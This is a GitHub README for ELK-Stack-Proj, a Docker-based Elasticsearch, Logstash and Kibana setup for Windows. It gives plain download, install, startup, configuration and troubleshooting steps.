# ⚙️ ELK-Stack-Proj - Simple Log Management Made Easy

[![Download ELK-Stack-Proj](https://img.shields.io/badge/Download-ELK--Stack--Proj-blue?style=for-the-badge)](https://github.com/oumardaou/ELK-Stack-Proj/releases)

## 📋 About ELK-Stack-Proj

ELK-Stack-Proj is a tool designed for managing and analyzing logs. It combines Elasticsearch, Logstash, and Kibana for searching, processing, and visualizing data. This project also includes upgrades for better stability and added features.

You do not need programming skills to use this. It helps you find and understand data from your systems easily. Whether you want to monitor your computer, check server logs, or just explore data, ELK-Stack-Proj simplifies the process.

## 💻 System Requirements

Before starting, make sure your computer meets these requirements:

- **Operating System:** Windows 10 or higher  
- **Processor:** 2 GHz or faster, 64-bit  
- **Memory:** At least 8 GB of RAM  
- **Disk Space:** Minimum of 5 GB free space  
- **Network:** Internet connection for downloading and updates  
- **Software:** Docker Desktop installed and running (see setup below)  

This setup ensures the tool runs smoothly on your machine.

## 🚀 Getting Started

This guide will walk you through downloading, installing, and running ELK-Stack-Proj on your Windows computer. Each step is clear and easy to follow.

### 1. Download the Software

Visit the releases page to get the latest version:

[Download ELK-Stack-Proj](https://github.com/oumardaou/ELK-Stack-Proj/releases)

Click the link above or the badge at the top to open the download page.

Once there, look for the latest release. You will find different files depending on the release. For Windows users, the relevant installer or archive file should be named clearly (e.g., `ELK-Stack-Proj-Windows.zip` or `ELK-Stack-Proj-Setup.exe`).

Download the appropriate file by clicking on it. Save it where you can easily find it, such as your Desktop or Downloads folder.

### 2. Prepare Your Computer

Before running the software, install Docker Desktop if you do not have it. Docker is needed because ELK-Stack-Proj uses containers to run its components efficiently.

To install Docker Desktop:

- Visit: https://docs.docker.com/desktop/windows/install/  
- Follow the instructions for Windows installation.  

After installing, open Docker Desktop and ensure it runs without errors. Your system might ask you to restart your computer after the install.

### 3. Install ELK-Stack-Proj

If you downloaded an installer (`.exe`), double-click it and follow the prompts on screen. Accept the license terms and keep default settings.

If you downloaded a zip archive, extract the files to a folder on your computer. You can use built-in Windows tools: right-click the zip file and select “Extract All.”

### 4. Start ELK-Stack-Proj

Open the extracted folder or installation directory.

Look for a file named `start-elk.bat` or similar. This batch file will launch all necessary parts of the ELK stack using Docker.

Double-click on this file. A command window will open, showing the process as it runs.

The program needs some time to start fully, usually a few minutes. Do not close the window until you see a message that ELK is ready or running.

### 5. Use the Application

Once started, ELK-Stack-Proj runs in your web browser.

Open your preferred browser and enter the address:

http://localhost:5601

This will open Kibana, the web interface for ELK-Stack-Proj.

In Kibana, you can:

- Search and filter log data  
- Create visual charts and dashboards  
- Explore statistics in an easy way  

No coding is needed here. Use the menus and buttons to interact with your data.

## 🔧 How It Works

ELK-Stack-Proj uses three main tools:

- **Elasticsearch:** Stores and searches through your data quickly  
- **Logstash:** Collects, processes, and sends data to Elasticsearch  
- **Kibana:** Shows collected data with graphs and tables  

This setup lets you see information from computers, servers, or applications in one place.

The project includes upgrades improving how these tools work together. It also adds extra protection and better user experience.

## ⚙️ Configuration Tips

You can customize ELK-Stack-Proj a little if needed.

By editing the `config` folder, you may change:

- Which logs are collected  
- Security settings  
- Display options in Kibana  

For most users, default settings work well. Only change them if you want specific changes.

## 🛠 Troubleshooting

If ELK-Stack-Proj doesn’t start or works slowly, try these steps:

- Restart Docker Desktop  
- Check that your PC meets system requirements  
- Make sure no other software blocks ports 5601, 9200, and 5044  
- Run the start file as Administrator (right-click and choose “Run as administrator”)  

If errors appear in the command window, copy the message and search online or check the project’s Issues page on GitHub.

## 🌐 Resources and Support

If you want to know more or need help:

- Visit the project’s GitHub page: https://github.com/oumardaou/ELK-Stack-Proj  
- See the release information for updates  
- Use the provided topics for searching help articles (e.g., Docker, REST API, Shell Script)  
- Ask questions or check existing ones in the GitHub Issues section  

## 🔗 Download & Install Summary

- Visit [ELK-Stack-Proj Releases](https://github.com/oumardaou/ELK-Stack-Proj/releases)  
- Download the Windows installer or zip file  
- Install Docker Desktop if needed  
- Run the ELK start script in your installation folder  
- Open your browser at http://localhost:5601 to use the software  

[Download ELK-Stack-Proj](https://github.com/oumardaou/ELK-Stack-Proj/releases)